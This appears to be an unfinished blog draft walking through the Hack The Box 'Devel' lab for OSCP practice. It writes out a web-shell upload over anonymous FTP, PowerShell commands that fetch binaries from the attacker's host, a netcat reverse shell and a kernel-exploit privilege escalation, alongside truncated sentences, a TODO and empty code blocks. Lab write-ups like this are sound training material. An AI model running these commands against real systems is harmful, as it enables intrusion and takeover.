---
layout: post
title:  "Hack The Box - Devel - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Devel-Writeup" %}

# Introduction
The hack the box machine "Devel" is an easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge concerning default FTP configurations, 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `sudo nmap -sSCV -p- 10.10.10.5`. The `-sSCV` flag instructs nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that the host has is running a Microsoft IIS web server on port 80 and that FTP is available on port 21. In addition, the `ftp-anon` script reveals that anonymous logins to the FTP service are allowed! This means that it is possible to authenticate with the username `anonymous` and password `anonymous`

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sSCV -p- 10.10.10.5@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-12 08:17 EDT
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 22.49% done; ETC: 08:21 (0:03:16 remaining)
Nmap scan report for 10.10.10.5
Host is up (0.066s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
@@@21/tcp open  ftp     Microsoft ftpd@@@
| ftp-syst: 
|_  SYST: Windows_NT
| @@@ftp-anon: Anonymous FTP login allowed@@@ (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 @@@iisstart.htm@@@
|_03-17-17  05:37PM               184946 @@@welcome.png@@@
@@@80/tcp open  http    Microsoft IIS httpd 7.5@@@
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 301.81 seconds
{% endhighlight %}

If we navigate to port 80 in a browser, we discover an IIS web server which shows us the `welcome.png` file. This means that the directory we can access over FTP is likely the web root! As such, we could potentially obtain remote code execution by uploading a web shell to the target.

![port80](/assets/{{ imgDir }}/port80.png)

TODO: ASP vs ASPX

We can copy the the aspx web shell that comes with Kali Linux to our working directoy and then upload it using FTP, as demonstrated below.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@cp /usr/share/webshells/aspx/cmdasp.aspx .@@

┌──(kali㉿kali)-[/tmp/x]
└─$ @@ftp anonymous@10.10.10.5@@             
Connected to 10.10.10.5.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 @@@User logged in@@@.
Remote system type is Windows_NT.
ftp> @@put cmdasp.aspx@@
local: cmdasp.aspx remote: cmdasp.aspx
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; @@@Transfer starting@@@.
100% |***********************************************************************|  1442        9.04 MiB/s    --:-- ETA
226 @@@Transfer complete@@@.
1442 bytes sent in 00:00 (8.05 KiB/s)
ftp> @@ls@@
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
05-16-22  04:39PM                 1442 @@@cmdasp.aspx@@@
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp>
{% endhighlight %}

By navigating to [http://10.10.10.5/cmdasp.aspx](http://10.10.10.5/cmdasp.aspx) in a browser, we can conclude that the FTP directory is indeed the web root! If we execute the command `whoami`, we can see that we have code execution as the `iis apppool\web` account.

![ws](/assets/{{ imgDir }}/ws.png)

The next step is to get an interactive shell. We can do this using a netcat binary. We can send this binary to the target host using a Python web server. 

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@locate nc.exe@@
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
@@@/usr/share/windows-resources/binaries/nc.exe@@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@cp /usr/share/windows-resources/binaries/nc.exe .@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo python3 -m http.server 80@@
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@nc -lvp 443@@
listening on [any] 443 ...
10.10.10.5: inverse host lookup failed: Unknown host
@@@connect to [10.10.16.5] from (UNKNOWN) [10.10.10.5]@@@ 49162
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>@@whoami@@
whoami
@@@iis apppool\web@@@

c:\windows\system32\inetsrv>
{% endhighlight %}

We can download the netcat binary to the target host by executing `powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.16.5/nc.exe','C:\Windows\TEMP\nc.exe')` using the webshell. This command will save the netcat binary to the `C:\Windows\Temp` directory which is usually writable by anyone. Once we have downloaded the binary, we execute `nc -lvp 443` to start a netcat listener on port 443. Then, we use the webshell to execute the command `C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.16.5 443` which connects back to our host on port 443 with an interactive shell, as can be seen above.

# Privilege Escalation

Systeminfo

search on google for:
window 7 6.1.7600 N/A Build 7600 kernel exploit

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe
--2022-05-16 08:37:37--  https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS11-046/ms11-046.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS11-046/ms11-046.exe [following]
--2022-05-16 08:37:39--  https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS11-046/ms11-046.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 112815 (110K) [application/octet-stream]
Saving to: ‘ms11-046.exe’

ms11-046.exe                 100%[==============================================>] 110.17K  --.-KB/s    in 0.05s   

2022-05-16 08:37:39 (1.97 MB/s) - ‘ms11-046.exe’ saved [112815/112815]
{% endhighlight %}

{% highlight none linenos %}
c:\windows\system32\inetsrv>whoami                                          
whoami
iis apppool\web

c:\windows\system32\inetsrv>@@powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.16.5/ms11-046.exe','C:\Windows\TEMP\ms11-046.exe')@@
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.16.5/ms11-046.exe','C:\Windows\TEMP\ms11-046.exe')

c:\windows\system32\inetsrv>@@C:\Windows\Temp\ms11-046.exe@@
C:\Windows\Temp\ms11-046.exe

@@@c:\Windows\System32@@@>@@whoami@@
whoami
@@@nt authority\system@@@

c:\Windows\System32>
{% endhighlight %}
We notice that the current working directory is changed and if we execute `whoami` we can see that we have successfully compromised the `nt authority\system` account!

{% highlight none linenos %}
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}

{% highlight none linenos %}
{% endhighlight %}
